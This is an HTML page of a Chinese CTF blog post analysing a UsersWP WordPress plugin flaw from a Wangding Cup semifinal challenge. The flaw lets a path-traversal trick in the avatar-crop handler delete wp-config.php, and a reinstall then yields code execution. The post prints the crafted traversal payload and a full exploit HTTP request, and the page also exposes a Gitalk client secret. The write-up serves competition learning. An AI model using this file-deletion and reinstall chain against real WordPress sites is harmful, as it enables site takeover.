@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>网鼎杯半决赛渗透wordpress plugin rce分析 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="网鼎杯半决赛渗透wordpress plugin rce分析 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="网鼎杯半决赛渗透wordpress plugin rce分析"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/m4_xEqrL4/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/01QWkRyOV/" class="tag">洞</a>
+            
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+        </span>
+            <h1>网鼎杯半决赛渗透wordpress plugin rce分析</h1>
+            <span class="meta">
+            	Posted on
+              2023-04-14，3 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>www.zip。题目给了hint</p>
+<p>userwp插件洞。。unlink rce</p>
+<p>思路就是userwp unlink 删除一个config.php 重装rce</p>
+<p>全局搜unlink。就三个点。一个</p>
+<figure data-type="image" tabindex="1"><img src="https://c.img.dasctf.com/images/2023414/1681478515770-63877b9e-b8c7-4e08-b366-13f9eda24ad6.png" alt="image-20230414212204216" loading="lazy"></figure>
+<p>这里参数是定死的。没办法。</p>
+<figure data-type="image" tabindex="2"><img src="https://c.img.dasctf.com/images/2023414/1681478567512-92091076-034b-46e0-8a7e-35a662ec0288.png" alt="image-20230414212302777" loading="lazy"></figure>
+<p>接下来两个都是漏洞点。</p>
+<p>直接反推过去。</p>
+<figure data-type="image" tabindex="3"><img src="https://c.img.dasctf.com/images/2023414/1681478649752-8ecd896b-07f3-4f28-b162-d8bae5199b64.png" alt="image-20230414212421931" loading="lazy"></figure>
+<p>红框中的是一个sign校验。可以构造。先不管，下面POST的uwp_crop直接传参给<code>$image_url</code></p>
+<figure data-type="image" tabindex="4"><img src="https://c.img.dasctf.com/images/2023414/1681478668471-677e78e6-e0d7-4282-b06e-7375896cfac8.png" alt="image-20230414212444085" loading="lazy"></figure>
+<p>下面就用pathinfo对<code>$image_url</code>获取ext和name。传入1.php就会变成1_uwp_avatar_thumb.php</p>
+<figure data-type="image" tabindex="5"><img src="https://c.img.dasctf.com/images/2023414/1681478727071-d52e93af-44f3-4a0a-acf7-cdd8ce49f808.png" alt="image-20230414212542418" loading="lazy"></figure>
+<p>​	然后传入uwp_resizeThumbnailImage。函数内容就是返回第一个参数。。不用多看</p>
+<figure data-type="image" tabindex="6"><img src="https://c.img.dasctf.com/images/2023414/1681478852283-9cd7e0e2-9363-4879-9614-976d65e3f493.png" alt="image-20230414212745364" loading="lazy"></figure>
+<p>所以上面传入1.php会变成1_uwp_avatar_thumb.php。怎么删除config.php呢。</p>
+<p>注意这里str_replace。会把<code>$upload_url</code>替换为空。</p>
+<figure data-type="image" tabindex="7"><img src="https://c.img.dasctf.com/images/2023414/1681478895683-0209bc64-abf2-47b5-88f4-a44e355e7fb3.png" alt="image-20230414212831318" loading="lazy"></figure>
+<p>是把<code>http://host/</code>替换为空</p>
+<figure data-type="image" tabindex="8"><img src="https://c.img.dasctf.com/images/2023414/1681478959846-597c33dd-10ef-407e-9f36-77143fc7a82b.png" alt="image-20230414212935548" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://c.img.dasctf.com/images/2023414/1681479844692-c73293d9-90c2-4396-b62d-39b068c2fc1d.png" alt="image-20230414214420396" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://c.img.dasctf.com/images/2023414/1681479856254-813672fd-00be-4b97-b99c-a0bace974807.png" alt="image-20230414214431799" loading="lazy"></figure>
+<pre><code>/../../../../../config.http://127.0.0.1/wp-content/uploadsphp
+经过pathinfo时。解析为
+array(3) {
+  [&quot;dirname&quot;]=&gt;
+  string(50) &quot;/../../../../../config.http://127.0.0.1/wp-content&quot;
+  [&quot;basename&quot;]=&gt;
+  string(10) &quot;uploadsphp&quot;
+  [&quot;filename&quot;]=&gt;
+  string(10) &quot;uploadsphp&quot;
+}
+没有Ext了。也就变成了把
+uploadsphp. 替换成1_uwp_avatar_thumb.php
+由于http://127.0.0.1/wp-content/uploads。这个之后会被替换为空的内容存在。所以没被替换。
+
+然后到了
+$cropped = str_replace( $upload_url, '', $cropped );
+替换掉了http://127.0.0.1/wp-content/uploads。url又变成了../../../../../config.php
+
+</code></pre>
+<p>最终忽略掉wp_verify_nonce的exp。wp_verify_nonce是队友调的。懒得写了</p>
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5c016e8f0f95f039102cbe8366c5c7f3=test%7C1681652395%7CqtCZU9g4soL133lLkf1pnUbt6zBWpoOCSKthvD3N9ML%7C3a29c08073c831573e877b8dee2e70020332c26d0b91d2f5f319eac5180fd6bc
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+
+action=uwp_ajax_login_form&amp;uwp_avatar_crop=1&amp;uwp_crop=/../../../wp-config.http://127.0.0.1/wp-content/uploadsphp
+</code></pre>
+<p>最后<code>http://127.0.0.1/wp-admin/setup-config.php?step=1&amp;language=zh_CN</code></p>
+<p>重装数据库。登录后台应该就能RCE了。比赛的时候。最后十分钟调出来了。题目不出网bootstrap转半天。。还没拿到nonce就结束了。</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/JSF9GgDPM/">
+              <span class="post-title">
+                强国杯决赛Writeup&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
